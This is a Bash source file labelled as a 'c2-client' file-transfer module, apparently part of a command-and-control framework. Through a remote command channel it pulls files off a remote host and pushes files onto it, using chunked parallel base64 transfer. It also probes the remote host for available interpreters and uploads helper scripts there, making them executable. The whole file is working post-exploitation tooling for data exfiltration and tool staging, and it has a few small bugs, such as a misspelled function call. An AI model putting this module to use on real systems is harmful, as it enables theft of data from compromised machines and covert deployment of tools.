#!/usr/bin/env bash
#c2-client module
#eFSiTjxlkn
#File transfer module

source funcmgr.sh

print_warn() {
  echo -e "${YELLOW}[!]${NC} $1" >&2
}

print_err() {
  echo -e "${RED}[!]${NC} $1" >&2
}
print_std() {
  echo -e "${GREEN}[+]${NC} $1"
}

print_help() {
  echo -e "${BLUE}$1${NC} $2"
}

print_out() {
  echo -e "${GREEN}[+]${YELLOW} $1${NC}"
}

print_dbg() {
   if [[ "${DEBUG}" == "1" ]]; then
     local ts
     ts=$(date +"%Y-%m-%d %H:%M:%S")
     echo "[$ts] $1" >> "$DEBUG_LOG_FILE"
   fi
}

PROGRESS_WIDTH=35

eFSiTjxlkn_init() {
  register_function "download" "parallel_download" 7 "Download a file"
  register_function "upload" "parallel_upload" 7 "Upload a file"
  register_function "emergency_upload" "emergency_upload" 3 "Emergency upload for small non-binary files"
  register_function "emergency_download" "emergency_download" 3 "Emergency download for small non-binary files"
}

eFSiTjxlkn_description() {
  echo "File Upload/Download module"
}

eFSiTjxlkn_help() {
  print_help "download" "<remote> [-c chunk_size] [-o local] [-t threads]"
  print_help "upload" "<local> [-c chunk_size] [-o remote] [-t threads]"
  print_help "emergency_upload" "<local> [-o remote]"
  print_help "emergency_upload" "<remote> [-o local]"
}

# emergency_download <remote_file> [-o local_file]
# Performs a remote `cat` on <remote_file> via send_cmd and writes the output to a local file.
# If -o is not provided, the local filename defaults to the basename of the remote file.
emergency_download() {
  local REMOTE_FILE="$1"
  local LOCAL_OUT=""
  shift

  # Parse optional -o parameter
  while getopts "o:" opt; do
    case "$opt" in
      o) LOCAL_OUT="$OPTARG" ;;
      \?)
        print_err "Unknown parameter: -$OPTARG"
        return 1
        ;;
      :)
        print_err "Missing value for -$OPTARG"
        return 1
        ;;
    esac
  done

  if [[ -z "$REMOTE_FILE" ]]; then
    print_err "Usage: emergency_download <remote_file> [-o local_file]"
    return 1
  fi

  # Default local filename: basename of remote file
  if [[ -z "$LOCAL_OUT" ]]; then
    LOCAL_OUT="$(basename "$REMOTE_FILE")"
  fi

  # Escape single quotes in remote filename for safe single-quoted shell literal:
  # e.g., file'name -> 'file'"'"'name'
  local REMOTE_ESCAPED
  REMOTE_ESCAPED=$(printf "%s" "$REMOTE_FILE" | sed "s/'/'\"'\"'/g")

  # Build remote command: cat 'remote_file' 2>/dev/null
  local REMOTE_CMD
  REMOTE_CMD="cat '$REMOTE_ESCAPED' 2>/dev/null"

  print_std "Downloading remote file '$REMOTE_FILE' -> local '$LOCAL_OUT' ..."

  # Call send_cmd and stream output to local file
  # Note: send_cmd is expected to write the remote command output to stdout.
  # Using a subshell redirection to capture exit status of send_cmd.
  if send_cmd "$REMOTE_CMD" >"$LOCAL_OUT"; then
    # Quick sanity check: ensure file is non-empty (optional)
    if [[ -s "$LOCAL_OUT" ]]; then
      local SIZE
      SIZE=$(stat -c%s "$LOCAL_OUT" 2>/dev/null || wc -c <"$LOCAL_OUT")
      print_std "Download complete: $LOCAL_OUT ($SIZE bytes)"
      return 0
    else
      print_err "Download produced empty file: $LOCAL_OUT"
      return 2
    fi
  else
    print_err "send_cmd failed while attempting to cat remote file"
    rm -f "$LOCAL_OUT" 2>/dev/null || true
    return 3
  fi
}

# emergency_upload <local_file> [-o remote_file]
# Uploads a local file using `cat` piped through send_cmd into a remote file.
# If -o is not specified, the remote file name defaults to the basename of the local file.
emergency_upload() {
  local LOCAL_FILE="$1"
  local REMOTE_FILE=""
  shift

  # Parse optional -o parameter
  while getopts "o:" opt; do
    case "$opt" in
      o) REMOTE_FILE="$OPTARG" ;;
      \?)
        print_err "Unknown parameter: -$OPTARG"
        return 1
        ;;
      :)
        print_err "Missing value for -$OPTARG"
        return 1
        ;;
    esac
  done

  if [[ -z "$LOCAL_FILE" ]]; then
    print_err "Usage: emergency_upload <local_file> [-o remote_file]"
    return 1
  fi

  if [[ ! -f "$LOCAL_FILE" ]]; then
    print_err "Local file not found: $LOCAL_FILE"
    return 1
  fi

  if [[ -z "$REMOTE_FILE" ]]; then
    REMOTE_FILE="$(basename "$LOCAL_FILE")"
  fi

  # Escape remote filename for safe shell usage
  local REMOTE_ESCAPED
  REMOTE_ESCAPED=$(printf "%s" "$REMOTE_FILE" | sed "s/'/'\"'\"'/g")

  print_std "Uploading local file '$LOCAL_FILE' -> remote '$REMOTE_FILE' ..."

  # Read file content and escape it for safe shell transmission
  local FILE_CONTENT
  FILE_CONTENT=$(<"$LOCAL_FILE")
  FILE_CONTENT_ESCAPED=$(printf "%s" "$FILE_CONTENT" | sed "s/'/'\\\\''/g")

  if send_cmd "printf '%s' '$FILE_CONTENT_ESCAPED' > '$REMOTE_ESCAPED'"; then
    # Add newline to ensure proper file ending
    send_cmd "echo >> '$REMOTE_ESCAPED'"

    # Verify upload by comparing file sizes
    #local LOCAL_SIZE
    #LOCAL_SIZE=$(stat -c%s "$LOCAL_FILE")
    #local REMOTE_SIZE
    #REMOTE_SIZE=$(send_cmd "ls -l '$REMOTE_ESCAPED' 2>/dev/null" | awk '{print $5}')

    #if [[ "$LOCAL_SIZE" -eq "$REMOTE_SIZE" ]]; then
    #  print_std "Upload verified: $REMOTE_FILE ($LOCAL_SIZE bytes)"
    #  return 0
    #else
    #  print_err "Size mismatch: local=$LOCAL_SIZE, remote=$REMOTE_SIZE"
    #  return 3
    #fi
  else
    print_err "send_cmd failed while attempting to upload"
    return 2
  fi
}

# remote_check_b64helper(): returns the name of a working base64 helper
# Available helpers: base64|openssl|php|python3|python|perl|ruby|xxd_od|none
remote_check_b64helper() {
  # Prefer built-in tools first
  if send_cmd "command -v base64 >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "base64"
    return
  fi

  if send_cmd "command -v openssl >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "openssl"
    return
  fi

  # Check for scripting language interpreters
  for cmd in awk php python3 python perl ruby; do
    if send_cmd "command -v $cmd >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
      echo "$cmd"
      return
    fi
  done

  # Check for xxd+od combination (fallback method)
  if send_cmd "command -v xxd >/dev/null 2>&1 && command -v od >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "xxd_od"
    return
  fi

  echo "none"
}

# remote_check_md5helper(): returns the name of a working md5 helper
# Available helpers: md5sum|openssl|php|python3|python|perl|ruby|none
remote_check_md5helper() {
  # Prefer md5sum if available
  if send_cmd "command -v md5sum >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "md5sum"
    return
  fi

  # OpenSSL fallback
  if send_cmd "command -v openssl >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
    echo "openssl"
    return
  fi

  # Check scripting languages
  for cmd in php python3 python perl ruby; do
    if send_cmd "command -v $cmd >/dev/null 2>&1 && echo yes || echo no" | grep -q yes; then
      echo "$cmd"
      return
    fi
  done

  echo "none"
}

# Draw progress bar for file transfer operations
draw_progress() {
  local CURRENT="$1" TOTAL="$2"
  local PERCENT=$((CURRENT * 100 / TOTAL))
  local FILLED=$((CURRENT * PROGRESS_WIDTH / TOTAL))
  local EMPTY=$((PROGRESS_WIDTH - FILLED))
  BAR=$(printf "%0.s#" $(seq 1 $FILLED))$(printf "%0.s." $(seq 1 $EMPTY))
  printf "\r[%s] %3d%% (%d/%d)" "$BAR" "$PERCENT" "$CURRENT" "$TOTAL"
}

# Parallel file upload with chunking and base64 encoding
# Parallel file upload with chunking and base64 encoding
parallel_upload() {
  local LOCAL_FILE="$1"
  local REMOTE_OUT="$1"
  local THREADS=8
  local CHUNK_SIZE=2048
  local REMOTE_B64="upload.b64"
  local PART_PREFIX="part_"

  if [[ "$HELPER" == "none" ]]; then
    print_err "No remote base64 helper. Upload stopped..."
    return 1
  fi

  if [[ "$HELPER_MD5" == "none" ]]; then
    print_err "No remote md5sum helper found. Upload stopped..."
    return 1
  fi

  shift # Remove the first parameter (LOCAL_FILE)
  # Parse command line options
  while getopts "c:o:t:" opt; do
    case $opt in
      c) CHUNK_SIZE="$OPTARG" ;;
      o) REMOTE_OUT="$OPTARG" ;;
      t) THREADS="$OPTARG" ;;
      \?)
        print_err "Unknown parameter: -$OPTARG"
        return 1
        ;;
      :)
        print_err "Bad value for -$OPTARG"
        return 1
        ;;
    esac
  done

  [[ ! -f "$LOCAL_FILE" ]] && {
    print_err "Local file not found"
    return 1
  }

  # Prepare base64 encoded temporary file
  B64TMP="$(mktemp)"
  $LOCAL_B64_ENCODE_CMD "$LOCAL_FILE" | tr -d '\n' >"$B64TMP"
  FILE_SIZE=$(stat -c%s "$B64TMP")
  print_std "Base64 file prepared: $FILE_SIZE bytes"

  # Calculate total chunks needed
  TOTAL_CHUNKS=$(((FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE))
  print_std "Splitting into $TOTAL_CHUNKS chunks with $THREADS threads..."

  # Clean up any existing part files
  rm -f ${PART_PREFIX}* 2>/dev/null || true

  # Split the base64 file into chunks by bytes (not lines)
  split -b "${CHUNK_SIZE}" -d "$B64TMP" "${PART_PREFIX}"

  # Count actual chunks created
  ACTUAL_CHUNKS=$(ls ${PART_PREFIX}* 2>/dev/null | wc -l)
  if [[ $ACTUAL_CHUNKS -eq 0 ]]; then
    print_err "No chunks created - file might be too small"
    rm -f "$B64TMP"
    return 1
  fi

  # Upload one chunk into its own remote part file
  upload_chunk() {
    local chunk_file="$1"
    local chunk_num=$(echo "$chunk_file" | grep -o '[0-9][0-9]*$')
    local chunk_content=$(<"$chunk_file")

    # Only escape single quotes for safe embedding inside '...'
    local escaped_content=$(printf "%s" "$chunk_content" | sed "s/'/'\\\\''/g")

    # Save chunk into its own remote part file
    local cmd="printf '%s' '$escaped_content' > ${REMOTE_B64}.part_${chunk_num}"
    if send_cmd "$cmd" >/dev/null; then
      print_dbg "Chunk $chunk_num uploaded"
      return 0
    else
      print_err "Failed to upload chunk $chunk_num"
      return 1
    fi
  }

  # Parallel upload of chunks
  CURRENT=0
  for chunk in ${PART_PREFIX}*; do
    upload_chunk "$chunk" &
    CURRENT=$((CURRENT + 1))
    draw_progress "$CURRENT" "$ACTUAL_CHUNKS"

    # Limit number of concurrent threads
    if (($(jobs -r | wc -l) >= THREADS)); then
      wait -n
    fi
  done

  # Wait for all remaining jobs to complete
  wait
  echo

  # Assemble file on remote system in correct order
  print_std "Assembling file on remote system..."
  send_cmd "cat ${REMOTE_B64}.part_* > ${REMOTE_B64}.parts && rm ${REMOTE_B64}.part_*"

  # Decode to final output
  send_cmd "$BASE64_DECODE_CMD ${REMOTE_B64}.parts > '$REMOTE_OUT' && rm ${REMOTE_B64}.parts"

  # Verify upload by comparing file sizes
  local remote_size=$(send_cmd "ls -l '$REMOTE_OUT'" | awk '{print $5}')
  local local_size=$(stat -c%s "$LOCAL_FILE")
  if [[ "$remote_size" -eq "$local_size" ]]; then
    print_std "Upload verified: $remote_size bytes"
  else
    print_err "Size mismatch: local=$local_size, remote=$remote_size"
  fi

  # Verify integrity with MD5 checksum
  print_std "Verifying integrity with md5sum..."
  local remote_md5=$(send_cmd "$MD5_CMD '$REMOTE_OUT'" | awk '{print $1}')
  local local_md5=$(md5sum "$LOCAL_FILE" | awk '{print $1}')

  if [[ "$remote_md5" == "$local_md5" ]]; then
    print_std "MD5 hash match ($local_md5)"
  else
    print_err "MD5 mismatch! Remote: $remote_md5  Local: $local_md5"
  fi

  # Cleanup temporary files
  rm -f ${PART_PREFIX}* "$B64TMP"
  print_std "Parallel upload finished: $REMOTE_OUT"
}

# Parallel file download with chunking and base64 decoding
parallel_download() {
  local REMOTE_FILE="$1"
  local LOCAL_OUT="$1"
  local THREADS=8
  local CHUNK_SIZE=2048
  local TMP_DIR="$(mktemp -d)"
  local PART_PREFIX="${TMP_DIR}/part_"

  shift # Remove the first parameter (REMOTE_FILE)

  if [[ "$HELPER" == "none" ]]; then
    print_err "No remote base64 helper. Download stopped..."
    return 1
  fi

  if [[ "$HELPER_MD5" == "none" ]]; then
    print_err "No remote md5sum helper found. Download stopped..."
    return 1
  fi

  # Parse command line options
  while getopts "c:o:t:" opt; do
    case $opt in
      c) CHUNK_SIZE="$OPTARG" ;;
      o) LOCAL_OUT="$OPTARG" ;;
      t) THREADS="$OPTARG" ;;
      \?)
        print_err "Unknown parameter: -$OPTARG"
        return 1
        ;;
      :)
        print_err "Bad value for -$OPTARG"
        return 1
        ;;
    esac
  done

  # Get remote file size
  print_std "Getting file size..."
  FILE_SIZE=$(send_cmd "ls -l '$REMOTE_FILE'" | awk '{print $5}')

  # Calculate total chunks needed
  TOTAL_CHUNKS=$(((FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE))
  print_std "Downloading $FILE_SIZE bytes in $TOTAL_CHUNKS chunks ($THREADS threads)"

  # Function to download a single chunk (as base64 text, without newline)
  download_chunk() {
    local chunk_num="$1"
    local offset=$((chunk_num * CHUNK_SIZE))
    local count=$((chunk_num < TOTAL_CHUNKS - 1 ? CHUNK_SIZE : FILE_SIZE - offset))
    local output_file="${PART_PREFIX}${chunk_num}.b64"

    CMD="dd if='$REMOTE_FILE' bs=1 skip=$offset count=$count 2>/dev/null | $BASE64_ENCODE_CMD"
    RESPONSE=$(send_cmd "$CMD")

    if [[ -n "$RESPONSE" ]]; then
      echo -n "$RESPONSE" >"$output_file"
      print_dbg "Chunk $chunk_num OK ($count bytes)"
      return 0
    else
      print_err "Empty response for chunk $chunk_num"
      return 1
    fi
  }

  # Parallel download of chunks
  CURRENT=0
  for ((chunk_num = 0; chunk_num < TOTAL_CHUNKS; chunk_num++)); do
    download_chunk "$chunk_num" &
    CURRENT=$((CURRENT + 1))
    draw_progress "$CURRENT" "$TOTAL_CHUNKS"

    # Limit number of concurrent threads
    if ((CURRENT % THREADS == 0)) || ((chunk_num == TOTAL_CHUNKS - 1)); then
      wait
    fi
  done

  echo

  # Assemble base64 data in correct order
  print_std "Assembling base64 data..."
  for ((i = 0; i < TOTAL_CHUNKS; i++)); do
    cat "${PART_PREFIX}${i}.b64" >>"${TMP_DIR}/full.b64"
  done

  # Decode to final output file
  $LOCAL_B64_DECODE_CMD "${TMP_DIR}/full.b64" >"$LOCAL_OUT"

  # Verify final file size
  local final_size=$(stat -c%s "$LOCAL_OUT" 2>/dev/null || wc -c <"$LOCAL_OUT")
  if [[ "$final_size" -eq "$FILE_SIZE" ]]; then
    print_std "Size verified: $final_size/$FILE_SIZE bytes"
  else
    print_err "Size mismatch: $final_size/$FILE_SIZE bytes"
  fi

  # Verify integrity with MD5 checksum
  print_std "Verifying integrity with md5sum..."
  local remote_md5=$(send_cmd "$MD5_CMD '$REMOTE_FILE'" | awk '{print $1}')
  local local_md5=$(md5sum "$LOCAL_OUT" | awk '{print $1}')

  if [[ "$remote_md5" == "$local_md5" ]]; then
    print_std "MD5 hash match ($local_md5)"
  else
    print_err "MD5 mismatch! Remote: $remote_md5  Local: $local_md5"
  fi

  # Cleanup temporary directory
  rm -rf "$TMP_DIR"
  print_std "Parallel download finished: $LOCAL_OUT"
}

# Main function to initialize base64 helpers and detect remote capabilities
eFSiTjxlkn_main() {
  HELPER="none"
  B64_INTERPRETER=$(remote_check_b64helper)
  # Set appropriate base64 encode/decode commands based on available helpers
  case "$B64_INTERPRETER" in
    base64)
      BASE64_ENCODE_CMD="base64 -w0"
      BASE64_DECODE_CMD="base64 -d"
      HELPER=""
      ;;
    openssl)
      BASE64_ENCODE_CMD="./b64helper.sh encode"
      BASE64_DECODE_CMD="./b64helper.sh decode"
      HELPER="b64helper.sh"
      ;;
    xxd_od)
      BASE64_ENCODE_CMD="./b64helper2.sh encode"
      BASE64_DECODE_CMD="./b64helper2.sh decode"
      HELPER="b64helper2.sh"
      ;;
    awk)
      BASE64_ENCODE_CMD="awk -f ./b64helper.awk encode"
      BASE64_DECODE_CMD="awk -f ./b64helper.awk decode"
      HELPER="b64helper.awk"
      ;;
    php)
      BASE64_ENCODE_CMD="php ./b64helper.php encode"
      BASE64_DECODE_CMD="php ./b64helper.php decode"
      HELPER="b64helper.php"
      ;;
    python3)
      BASE64_ENCODE_CMD="python3 ./b64helper.py encode"
      BASE64_DECODE_CMD="python3 ./b64helper.py decode"
      HELPER="b64helper.py"
      ;;
    python)
      BASE64_ENCODE_CMD="python ./b64helper.py encode"
      BASE64_DECODE_CMD="python ./b64helper.py decode"
      HELPER="b64helper.py"
      ;;
    perl)
      BASE64_ENCODE_CMD="perl ./b64helper.pl encode"
      BASE64_DECODE_CMD="perl ./b64helper.pl decode"
      HELPER="b64helper.pl"
      ;;
    ruby)
      BASE64_ENCODE_CMD="ruby ./b64helper.rb encode"
      BASE64_DECODE_CMD="ruby ./b64helper.rb decode"
      HELPER="b64helper.rb"
      ;;
    none)
      pint_ert "Remote base64 detection error"
      return 1
      ;;
  esac

  # Set local base64 commands (use system base64 if available)
  if [[ "$HELPER" == "xxd_od" ]]; then
    LOCAL_B64_DECODE_CMD="$BASE64_DECODE_CMD"
    LOCAL_B64_ENCODE_CMD="$BASE64_ENCODE_CMD"
  else
    LOCAL_B64_DECODE_CMD="base64 -d"
    LOCAL_B64_ENCODE_CMD="base64 -w0"
  fi

  # Upload helper script if needed
  if [[ -z "$HELPER" ]]; then
    print_std "Found base64 on remote system no helper is needed..."
  else
    print_std "Found $B64_INTERPRETER uploading $HELPER by emergency upload...."
    emergency_upload "./helpers/$HELPER" "-o" "$HELPER"
    send_cmd "chmod +x $HELPER"
  fi

  HELPER_MD5="none"
  MD5_INTERPRETER=$(remote_check_md5helper)
  case "$MD5_INTERPRETER" in
    md5sum)
      MD5_CMD="md5sum"
      HELPER_MD5=""
      ;;
    openssl)
      MD5_CMD="./md5helper.sh"
      HELPER_MD5="md5helper.sh"
      ;;
    php)
      MD5_CMD="php ./md5helper.php"
      HELPER_MD5="md5helper.php"
      ;;
    python3)
      MD5_CMD="python3 ./md5helper.py"
      HELPER_MD5="md5helper.py"
      ;;
    python)
      MD5_CMD="python ./md5helper.py"
      HELPER_MD5="md5helper.py"
      ;;
    perl)
      MD5_CMD="perl ./md5helper.pl"
      HELPER_MD5="md5helper.pl"
      ;;
    ruby)
      MD5_CMD="ruby ./md5helper.rb"
      HELPER_MD5="md5helper.rb"
      ;;
    none)
      print_err "Remote MD5 detection error"
      return 1
      ;;
  esac

  # Upload helper if needed

  if [[ -z "$HELPER_MD5" ]]; then
    print_std "Found md5sum on remote system no helper is needed..."
  else
    print_std "Found $MD5_INTERPRETER uploading $HELPER_MD5 by emergency upload...."
    emergency_upload "./helpers/$HELPER_MD5" "-o" "$HELPER_MD5"
    send_cmd "chmod +x $HELPER_MD5"
  fi

}
